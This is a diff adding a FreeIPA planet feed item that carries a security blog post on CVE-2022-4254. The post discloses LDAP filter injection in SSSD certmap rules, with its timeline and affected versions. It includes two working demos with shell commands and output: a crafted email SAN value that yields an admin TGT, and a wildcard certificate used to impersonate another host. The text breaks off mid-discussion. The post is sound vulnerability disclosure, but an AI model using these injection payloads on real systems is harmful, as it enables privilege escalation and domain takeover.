@@ -8,6 +8,542 @@
 	<description>FreeIPA Identity Management planet - technical blogs - http://planet.freeipa.org/</description>
 
 <item>
+	<title>Fraser Tweedale: CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability</title>
+	<guid>https://frasertweedale.github.io/blog-redhat/posts/2023-02-02-freeipa-pkinit-certmap-vuln.html</guid>
+	<link>https://frasertweedale.github.io/blog-redhat/posts/2023-02-02-freeipa-pkinit-certmap-vuln.html</link>
+	<description>&lt;h1 id=&quot;cve-2022-4254-freeipa-pkinit-certificate-mapping-vulnerability&quot;&gt;CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability&lt;/h1&gt;
+&lt;h2 id=&quot;executive-summary&quot;&gt;Executive summary &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#executive-summary&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.freeipa.org/&quot;&gt;FreeIPA&lt;/a&gt; supports the Kerberos &lt;em&gt;PKINIT&lt;/em&gt; protocol extension (&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4556&quot;&gt;RFC
+4556&lt;/a&gt;). PKINIT enables a client to authenticate to the KDC using
+an X.509 certificate and the corresonding private key, rather than a
+passphrase or keytab. FreeIPA uses &lt;em&gt;mapping rules&lt;/em&gt; to map a
+certificate presented during a PKINIT authentication request to the
+corresponding principal. The mapping filter is vulnerable to LDAP
+filter injection. The search result can be influenced by values in
+the certificate, which may be attacker controlled. In the most
+extreme case, an attacker could gain control of the &lt;code&gt;admin&lt;/code&gt; account,
+leading to full domain takeover.&lt;/p&gt;
+&lt;p&gt;FreeIPA is &lt;strong&gt;not vulnerable in its default configuration&lt;/strong&gt;. To
+exploit this bug requires:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PKINIT is used in the environment, with certmap rules that are
+susceptible to LDAP filter injection via data from the client’s
+certificate; and&lt;/li&gt;
+&lt;li&gt;A client certificate used for PKINIT includes data that result in
+the construction of an LDAP filter with a different meaning than
+the administrator intended. This is unlikely in general, but some
+use cases present a heightened risk, especially if the CA includes
+(or can be induced to include) client-supplied or
+attacker-controlled attributes in end-entity certificates.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The issue was assigned &lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2022-4254&quot;&gt;CVE-2022-4254&lt;/a&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;affected-versions&quot;&gt;Affected versions &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#affected-versions&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;The problem is in &lt;em&gt;libsss_certmap&lt;/em&gt;, which is part of &lt;a href=&quot;https://sssd.io/&quot;&gt;SSSD&lt;/a&gt;.
+FreeIPA servers use this library in &lt;code&gt;ipa_kdb&lt;/code&gt; Kerberos plugin
+implementation.&lt;/p&gt;
+&lt;p&gt;The issue was introduced in &lt;a href=&quot;https://sssd.io/release-notes/sssd-1.15.3.html&quot;&gt;SSSD 1.15.3&lt;/a&gt; (when
+&lt;em&gt;libsss_certmap&lt;/em&gt; was introduced) and resolved in
+&lt;a href=&quot;https://sssd.io/release-notes/sssd-2.3.1.html&quot;&gt;SSSD 2.3.1&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;All supported versions of RHEL 7 were affected (the fix was released
+on the RHEL 7.9 bugfix stream). RHEL 8.0 up to 8.3 (inclusive) were
+also affected (the fix was released to the still-supported streams).&lt;/p&gt;
+&lt;p&gt;RHEL 8.4 onwards and RHEL 9 are not affected. No supported versions
+of Fedora are affected.&lt;/p&gt;
+&lt;h3 id=&quot;timeline&quot;&gt;Timeline &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#timeline&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;2017-07-25&lt;/strong&gt;: &lt;em&gt;libsss_certmap&lt;/em&gt; was released with &lt;a href=&quot;https://sssd.io/release-notes/sssd-1.15.3.html&quot;&gt;SSSD 1.15.3&lt;/a&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2020-04-28&lt;/strong&gt;: SSSD issue &lt;a href=&quot;https://pagure.io/SSSD/sssd/issue/4180&quot;&gt;pagure#4180&lt;/a&gt; / &lt;a href=&quot;https://github.com/SSSD/sssd/issues/5135&quot;&gt;github#5135&lt;/a&gt; was
+created, reporting a lack of sanitisation of filter substitutions in
+maprules.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2020-07-24&lt;/strong&gt;: The sanitisation issue was fixed upstream and &lt;a href=&quot;https://sssd.io/release-notes/sssd-2.3.1.html&quot;&gt;SSSD
+2.3.1&lt;/a&gt; is released, containing the fix.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2022-11-16&lt;/strong&gt;: While reviewing a feature involving the use of
+PKINIT, I noticed that some versions of the &lt;em&gt;libsss_certmap&lt;/em&gt; code
+did not seem to sanitise certificate data used in LDAP filters. I
+started to investigate.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2022-11-17&lt;/strong&gt;: I succeed in exploiting the behaviour, and began
+internal discussions with Red Hat’s Platform Security
+engineering team.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2022-12-01&lt;/strong&gt;: I sent my analysis to Red Hat’s Product Security
+team. &lt;a href=&quot;https://access.redhat.com/security/cve/CVE-2022-4254&quot;&gt;CVE-2022-4254&lt;/a&gt; was reserved for this issue on the same
+day.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2023-01-24&lt;/strong&gt;: Planned release of fix to RHEL 7.9 &lt;code&gt;sssd&lt;/code&gt; package,
+in Batch Update 20. Details of the vulnerability were made public.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&quot;problem-description&quot;&gt;Problem description &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#problem-description&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;FreeIPA supports &lt;em&gt;certificate mapping rules&lt;/em&gt; for mapping
+certificates presented during PKINIT authentication to a Kerberos
+principal. Certmap rules are stored in the LDAP database under
+&lt;code&gt;cn=certmaprules,cn=certmap,{basedn}&lt;/code&gt;. The &lt;code&gt;ipa_kdb&lt;/code&gt; plugin uses
+&lt;em&gt;libsss_certmap&lt;/em&gt; to process certmap rules. An example rule object:&lt;/p&gt;
+&lt;pre class=&quot;ldif&quot;&gt;&lt;code&gt;dn: cn=certmap1,cn=certmaprules,cn=certmap,dc=ipa,dc=test
+cn: certmap1
+ipacertmapmaprule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
+ipaenabledflag: TRUE
+objectClass: ipacertmaprule
+objectClass: top&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &lt;code&gt;ipacertmaprule&lt;/code&gt; attribute is a string representation of an LDAP
+filter (&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4515&quot;&gt;RFC 4515&lt;/a&gt;), with substitution templates in curly braces
+(e.g. &lt;code&gt;{subject_dn}&lt;/code&gt;). Template substitution is performed by the
+&lt;code&gt;sss_certmap_get_search_filter&lt;/code&gt; subroutine. The supported templates
+are described in &lt;code&gt;sss_certmap(5)&lt;/code&gt;. They include:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;{cert!base64}&lt;/code&gt; (base64 encoding of whole certificate)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{issuer_dn}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{subject_dn}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{subject_rfc822_name}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;{subject_dns_name}&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The KDC uses the resulting filter within a bigger search filter that
+it uses to match the principal. The filter includes the requested
+principal name from the Kerberos &lt;em&gt;authentication service request
+(&lt;code&gt;AS_REQ&lt;/code&gt;)&lt;/em&gt;, and the maprule filter. The complete filter has the
+following structure (wrapped for readability):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(&amp;amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=REQUESTED_PRINCIPAL@REQUESTED_REALM)
+    (krbPrincipalName:caseIgnoreIA5Match:=REQUESTED_PRINCPAL@REQUESTED_REALM)
+  )
+  MAPRULE_FILTER_GOES_HERE
+)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Note that the requested principal is &lt;strong&gt;specified by the client&lt;/strong&gt; in
+the Kerberos &lt;code&gt;AS_REQ&lt;/code&gt;. This value &lt;em&gt;is properly escaped&lt;/em&gt; where it is
+inserted in the filter. But it is important to note that the client
+can specify any principal the maprule filter fragment matches.&lt;/p&gt;
+&lt;h3 id=&quot;sanitisation-not-performed&quot;&gt;Sanitisation not performed &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#sanitisation-not-performed&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Some template substitutions are inherently safe, but some use values
+from the certificate that could contain characters with special
+meaning in LDAP filters. Of the substitutions listed above, only
+&lt;code&gt;{cert!base64}&lt;/code&gt; is safe. The others could contain special
+characters (and there are still more that I did not list). Values
+that could contain special characters have to be sanitised
+(escaped). Specifically, the following characters must be replaced
+with a &lt;em&gt;hex escape sequence&lt;/em&gt;:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;NUL&lt;/code&gt; → &lt;code&gt;\00&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;(&lt;/code&gt; → &lt;code&gt;\28&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;)&lt;/code&gt; → &lt;code&gt;\29&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;*&lt;/code&gt; → &lt;code&gt;\2A&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;\&lt;/code&gt; → &lt;code&gt;\5C&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The affected versions of SSSD do not perform this sanitisation. As
+a consequence, the template substitutions can result in invalid
+filters (resulting in authentication failure) or filters that match
+the wrong principal entry (dangerous). The next two sections
+demonstrate two different exploit scenarios.&lt;/p&gt;
+&lt;div class=&quot;note&quot;&gt;
+&lt;p&gt;LDAP filter injection has been assigned &lt;a href=&quot;https://cwe.mitre.org/data/definitions/90.html&quot;&gt;CWE-90&lt;/a&gt; in the &lt;em&gt;Common
+Weakness Enumeration&lt;/em&gt; database. Conceptually it is very similar to
+SQL injection (&lt;a href=&quot;https://cwe.mitre.org/data/definitions/89.html&quot;&gt;CWE-89&lt;/a&gt;).&lt;/p&gt;
+&lt;/div&gt;
+&lt;h2 id=&quot;demo-1-attacker-supplied-rfc822name&quot;&gt;Demo 1: Attacker-supplied &lt;code&gt;rfc822Name&lt;/code&gt; &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#demo-1-attacker-supplied-rfc822name&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;We will issue a certificate with an attacker-supplied &lt;code&gt;rfc822Name&lt;/code&gt;
+SAN value to an unprivileged user. The deployment has a plausible
+certmap rule with a structure that can be exploited to obtain a TGT
+for an attacker-specified user account, including highly privileged
+accounts such as &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;It is a fresh deployment running FreeIPA 4.6 on RHEL 7.9:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# cat /etc/redhat-release
+Red Hat Enterprise Linux Server release 7.9 (Maipo)
+
+# rpm -qa |grep ipa-
+ipa-client-4.6.8-5.el7.x86_64
+sssd-ipa-1.16.5-10.el7.x86_64
+ipa-server-4.6.8-5.el7.x86_64
+ipa-common-4.6.8-5.el7.noarch
+ipa-client-common-4.6.8-5.el7.noarch
+ipa-server-common-4.6.8-5.el7.noarch&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;setup&quot;&gt;Setup &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#setup&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Setup steps establish the user account, certmap rules, certificate
+profiles and issuance policies required for the subsequent attack.
+I perform these steps using the &lt;code&gt;admin&lt;/code&gt; account:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# klist
+Ticket cache: KEYRING:persistent:0:0
+Default principal: admin@IPA.TEST
+
+Valid starting     Expires            Service principal
+28/11/22 23:00:19  29/11/22 23:00:07  ldap/rhel78-0.ipa.test@IPA.TEST
+28/11/22 23:00:09  29/11/22 23:00:07  krbtgt/IPA.TEST@IPA.TEST&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Create the unprivileged user &lt;code&gt;alice&lt;/code&gt;. She will be the subject
+principal to whom the certificate will be issued.&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# ipa user-add alice --first Alice --last Able --password
+Password: XXXXXXXX
+Enter Password again to verify: XXXXXXXX
+------------------
+Added user &amp;quot;alice&amp;quot;
+------------------
+...&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Add a new &lt;code&gt;mail&lt;/code&gt; attribute to &lt;code&gt;alice&lt;/code&gt;’s LDAP entry. This will
+enable us to issue a certificate from the internal CA that includes
+the value as an &lt;code&gt;rfc822Name&lt;/code&gt; Subject Alternative Name value.&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# echo &amp;gt; mod.ldif &amp;lt;&amp;lt;EOF
+dn: uid=alice,cn=users,cn=accounts,dc=ipa,dc=test
+changetype: modify
+add: mail
+mail: &amp;quot;bogus)(uid=admin)(cn=&amp;quot;@ipa.test
+EOF
+
+# ldapmodify -Y GSSAPI &amp;lt; mod.ldif
+modifying entry &amp;quot;uid=alice,cn=users,cn=accounts,dc=ipa,dc=test&amp;quot;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I had to add the new &lt;code&gt;mail&lt;/code&gt; attribute via &lt;code&gt;ldapmodify&lt;/code&gt; because the
+email validation performed by the IPA API does not admit all valid
+local-part values. But it is in fact a valid email address.&lt;/p&gt;
+&lt;div class=&quot;note&quot;&gt;
+&lt;p&gt;The default access controls in FreeIPA do not allow non-admins to
+modify &lt;code&gt;mail&lt;/code&gt; attributes, even in their own entry. But I use this
+approach because it is plausible for an organisation to have a
+system that allows employees to request a specific mail alias.
+Indeed we have such a system at Red Hat, although I don’t know if it
+would allow such an exotic value.&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;Next, add a &lt;em&gt;CA ACL&lt;/em&gt; rule that permits certificate to be issued to
+user principals. For convenience we will use the included
+&lt;code&gt;caIPAserviceCert&lt;/code&gt; profile. Typical real world user certificate
+scenarios would require a dedicated profile.&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# ipa caacl-add users_caIPAserviceCert --usercat=all
+-------------------------------------
+Added CA ACL &amp;quot;users_caIPAserviceCert&amp;quot;
+-------------------------------------
+  ACL name: users_caIPAserviceCert
+  Enabled: TRUE
+  User category: all
+
+# ipa caacl-add-profile users_caIPAserviceCert --certprofile caIPAserviceCert
+  ACL name: users_caIPAserviceCert
+  Enabled: TRUE
+  User category: all
+  Profiles: caIPAserviceCert
+-------------------------
+Number of members added 1
+-------------------------&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Finally add the certmap rule. It has a two-part &lt;em&gt;or-list&lt;/em&gt; intended
+to match the &lt;code&gt;rfc822Name&lt;/code&gt; from the certificate to the &lt;code&gt;mail&lt;/code&gt;
+attribute, or else match the certificate subject DN to DN of the
+LDAP entry:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# ipa certmaprule-add certmap1 --maprule \
+    &amp;quot;(|(mail={subject_rfc822_name})(entryDN={subject_dn}))&amp;quot;
+--------------------------------------------------
+Added Certificate Identity Mapping Rule &amp;quot;certmap1&amp;quot;
+--------------------------------------------------
+  Rule name: certmap1
+  Mapping rule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
+  Enabled: TRUE&lt;/code&gt;&lt;/pre&gt;
+&lt;div class=&quot;note&quot;&gt;
+&lt;p&gt;The steps performed above are not part of the exploit itself, and
+they require administrator privileges to perform. They are
+presented as plausible configurations, the likes of which &lt;em&gt;may&lt;/em&gt;
+exist (or not) in a customer’s environment.&lt;/p&gt;
+&lt;/div&gt;
+&lt;h3 id=&quot;exploit&quot;&gt;Exploit &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#exploit&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;alice&lt;/code&gt; will request a certificate with the suspicious &lt;code&gt;rfc822Name&lt;/code&gt;
+and &lt;strong&gt;acquire a TGT for the &lt;code&gt;admin&lt;/code&gt; user&lt;/strong&gt;. First obtain a TGT for
+&lt;code&gt;alice&lt;/code&gt; (using password authentication):&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ kinit alice
+Password for alice@IPA.TEST:&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Create a new keypair and certificate signing request (CSR). The
+config causes the CSR to bear a SAN extension request containting
+the malicious &lt;code&gt;rfc822Name&lt;/code&gt;:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ echo &amp;gt; naughty.conf &amp;lt;&amp;lt;EOF
+[ req ]
+prompt = no
+encrypt_key = no
+distinguished_name = dn
+req_extensions = exts
+[ dn ]
+commonName = &amp;quot;alice&amp;quot;
+[ exts ]
+subjectAltName=email:\&amp;quot;bogus)(uid=admin)(cn=\&amp;quot;@ipa.test
+EOF
+
+$ openssl req -new -config naughty.conf \
+    -keyout naughty.key -out naughty.csr
+Generating a 2048 bit RSA private key
+..........+++
+......................+++
+writing new private key to 'naughty.key'
+-----&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Issue the certificate (this is a &lt;em&gt;self-service&lt;/em&gt; certificate request,
+which FreeIPA allows, subject to CA ACLs):&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ ipa cert-request naughty.csr \
+    --principal alice naughty.csr \
+    --certificate-out naughty.pem
+  Issuing CA: ipa
+  Certificate: MIIEPjCC...
+  Subject: CN=alice,O=IPA.TEST 202211171708
+  Subject email address: &amp;quot;bogus)(uid=admin)(cn=&amp;quot;@ipa.test
+  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
+  Not Before: Tue Nov 29 04:42:58 2022 UTC
+  Not After: Fri Nov 29 04:42:58 2024 UTC
+  Serial number: 13
+  Serial number (hex): 0xD&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Finally, use the new certificate and key to obtain a TGT &lt;strong&gt;for
+&lt;code&gt;admin&lt;/code&gt;&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ kinit -X X509_user_identity=FILE:naughty.pem,naughty.key admin
+
+$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: admin@IPA.TEST
+
+Valid starting     Expires            Service principal
+28/11/22 23:47:44  29/11/22 23:47:44  krbtgt/IPA.TEST@IPA.TEST&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The exploit succeeds because the unescaped &lt;code&gt;rfc822Name&lt;/code&gt; value
+results in a filter that matches the &lt;code&gt;admin&lt;/code&gt; user (formatted for
+readability):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(&amp;amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=alice@IPA.TEST)
+    (krbPrincipalName:caseIgnoreIA5Match:=alice@IPA.TEST)
+  )
+  (|
+    (mail=&amp;quot;bogus)
+    (uid=admin)
+    (cn=&amp;quot;@ipa.test)
+    (entrydn=CN=alice,O=IPA.TEST 202211171708)
+  )
+)&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;demo-2-wildcard-dns-name&quot;&gt;Demo 2: Wildcard DNS name &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#demo-2-wildcard-dns-name&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;A wildcard certificate can be used to &lt;strong&gt;obtain a TGT for a different
+host principal&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;setup-1&quot;&gt;Setup &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#setup-1&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Add a profile for issuing wildcard certificates. I will skip the
+details and instead refer to my &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/posts/2017-06-26-freeipa-wildcard-san.html&quot;&gt;blog post on this topic&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Add a host called &lt;code&gt;ipa.test&lt;/code&gt;, a &lt;em&gt;host group&lt;/em&gt; called &lt;code&gt;webservers&lt;/code&gt;,
+and make &lt;code&gt;ipa.test&lt;/code&gt; a member of &lt;code&gt;webservers&lt;/code&gt;:&lt;/p&gt;
+&lt;pre class=&quot;host&quot;&gt;&lt;code&gt;# ipa host-add ipa.test --force
+----------------------
+Added host &amp;quot;ipa.test&amp;quot;
+----------------------
+  Host name: ipa.test
+  Principal name: host/ipa.test@IPA.TEST
+  Principal alias: host/ipa.test@IPA.TEST
+  Password: False
+  Keytab: False
+  Managed by: ipa.test
+
+# ipa hostgroup-add webservers
+----------------------------
+Added hostgroup &amp;quot;webservers&amp;quot;
+----------------------------
+  Host-group: webservers
+
+# ipa hostgroup-add-member webservers --hosts ipa.test
+  Host-group: webservers
+  Member hosts: ipa.test
+-------------------------
+Number of members added 1
+-------------------------&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Add a &lt;em&gt;CA ACL&lt;/em&gt; that allows &lt;code&gt;webservers&lt;/code&gt; to be issued certificates
+via the &lt;code&gt;wildcard&lt;/code&gt; profile:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# ipa caacl-add webservers_wildcard
+----------------------------------
+Added CA ACL &amp;quot;webservers_wildcard&amp;quot;
+----------------------------------
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+
+# ipa caacl-add-host webservers_wildcard --hostgroup webservers
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+  Host Groups: webservers
+-------------------------
+Number of members added 1
+-------------------------
+
+# ipa caacl-add-profile webservers_wildcard --certprofile wildcard
+  ACL name: webservers_wildcard
+  Enabled: TRUE
+  Profiles: wildcard
+  Host Groups: webservers
+-------------------------
+Number of members added 1
+-------------------------&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Finally, add a certmap rule that uses SAN &lt;code&gt;dNSName&lt;/code&gt; values to locate
+the principal:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;# ipa certmaprule-add certmap2 \
+    --maprule &amp;quot;(fqdn={subject_dns_name})&amp;quot;
+--------------------------------------------------
+Added Certificate Identity Mapping Rule &amp;quot;certmap2&amp;quot;
+--------------------------------------------------
+  Rule name: certmap2
+  Mapping rule: (fqdn={subject_dns_name})
+  Enabled: TRUE&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;exploit-1&quot;&gt;Exploit &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#exploit-1&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;We will issue a wildcard certificate for &lt;code&gt;ipa.test&lt;/code&gt;, and use it to
+obtain a TGT for a different host. You could use &lt;em&gt;Certmonger&lt;/em&gt; to
+request the certificate, but I will interact directly with FreeIPA
+via the &lt;code&gt;ipa&lt;/code&gt; client program. The operator is the &lt;code&gt;host/ipa.test&lt;/code&gt;
+principal (I &lt;code&gt;kinit&lt;/code&gt;ed using the host keytab):&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: host/ipa.test@IPA.TEST
+
+Valid starting     Expires            Service principal
+29/11/22 03:52:59  30/11/22 03:52:59  krbtgt/IPA.TEST@IPA.TEST&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Create a keypair and CSR:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ openssl req -new -subj '/CN=ipa.test/' -nodes \
+    -keyout server.key -out server.csr
+Generating a 2048 bit RSA private key
+........................................................+++
+.....................................................................................................................+++
+writing new private key to 'server.key'
+-----&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Request the certificate, being sure to specify the &lt;code&gt;wildcard&lt;/code&gt;
+profile:&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ ipa cert-request server.csr \
+    --principal host/ipa.test \
+    --profile-id wildcard \
+    --certificate-out server.pem
+  Issuing CA: ipa
+  Certificate: MIIENTCC...
+  Subject: CN=ipa.test,O=IPA.TEST 202211171708
+  Subject DNS name: ipa.test, *.ipa.test
+  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
+  Not Before: Tue Nov 29 09:14:09 2022 UTC
+  Not After: Fri Nov 29 09:14:09 2024 UTC
+  Serial number: 16
+  Serial number (hex): 0x10&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Finally, use the new certificate and key to obtain a TGT for a
+&lt;strong&gt;different host&lt;/strong&gt; whose &lt;code&gt;fqdn&lt;/code&gt; attributes matches the LDAP
+substring filter &lt;code&gt;(fqdn=*.ipa.test)&lt;/code&gt;. In this example I acquire the
+TGT for &lt;strong&gt;&lt;code&gt;host/rhel78-0.ipa.test&lt;/code&gt;&lt;/strong&gt; (one of the FreeIPA servers).&lt;/p&gt;
+&lt;pre class=&quot;shell&quot;&gt;&lt;code&gt;$ kinit -X X509_user_identity=FILE:server.pem,server.key \
+    host/rhel78-0.ipa.test
+
+$ klist
+Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
+Default principal: host/rhel78-0.ipa.test@IPA.TEST
+
+Valid starting     Expires            Service principal
+29/11/22 04:15:52  30/11/22 04:15:52  krbtgt/IPA.TEST@IPA.TEST&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The exploit succeeds because the unescaped wildcard &lt;code&gt;dNSName&lt;/code&gt; value
+results in a &lt;strong&gt;&lt;em&gt;substring match&lt;/em&gt;&lt;/strong&gt; filter (formatted for
+readability):&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;(&amp;amp;
+  (|
+    (objectClass=krbprincipalaux)
+    (objectClass=krbprincipal)
+    (objectClass=ipakrbprincipal)
+  )
+  (|
+    (ipaKrbPrincipalAlias=host/rhel78-0.ipa.test@IPA.TEST)
+    (krbPrincipalName:caseIgnoreIA5Match:=host/rhel78-0.ipa.test@IPA.TEST)
+  )
+  (fqdn=*.ipa.test)
+)&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The maprule filter matches any principal whose &lt;code&gt;fqdn&lt;/code&gt; attribute ends
+in &lt;code&gt;.ipa.test&lt;/code&gt;. This sub-filter could match multiple principle
+entries, but the &lt;em&gt;client-specified&lt;/em&gt; principal name used in the
+&lt;code&gt;krbPrincipalName&lt;/code&gt; and &lt;code&gt;ipaKrbPricipalAlias&lt;/code&gt; filters select the one
+we want.&lt;/p&gt;
+&lt;p&gt;If there are multiple SAN values of the relevant type, the order is
+important. The &lt;em&gt;last&lt;/em&gt; value is used in the template substitution.
+In my certificate, the last value is &lt;code&gt;*.ipa.test&lt;/code&gt; so the exploit
+succeeds. If the order was reversed, the exploit would not succeed.
+This is an implementation detail of SSSD; it might as well have used
+the first value but it just happened to be implemented this way.&lt;/p&gt;
+&lt;h2 id=&quot;discussion&quot;&gt;Discussion &lt;a href=&quot;https://frasertweedale.github.io/blog-redhat/atom.xml#discussion&quot; class=&quot;section&quot;&gt;§&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;These exploits required a confluence of contributing factors to
+succeed. Deployments using PKINIT with exact certificate matching
+(the default) are also unaffected. The vulnerability only arises
+when the customer uses certmap rules. None are defined by default.
+Certmap rules (if they exist) are only &lt;em&gt;potentially&lt;/em&gt; vulnerable;
+several other factors have to come together.&lt;/p&gt;
+&lt;p&gt;The attacker must obtain a valid certificate from a trusted CA for a
+key they control. Except in limited cases (e.g. wildcard DNS names)
+the attacker must to be able to influence the attributes on the
+certificate. Only &lt;em&gt;free-form&lt;/em&gt; string attributes are potentially
+problematic. These include DNS name, email address, SAN DN values,
+principle names, and perhaps others. And there have to be SSSD
+certmap rule template substitutions for the targeted attribute(s).&lt;/p&gt;
+&lt;p&gt;Next, there had to be a certmap rule that substitutes the
+problematic value into the LDAP search filter. All filters that
+substitute free-form attributes are susceptible to exploitation.
+But in practice, &lt;em&gt;or-list&lt;/em&gt; filters are &lt;em&gt;more susceptible&lt;/em&gt; to
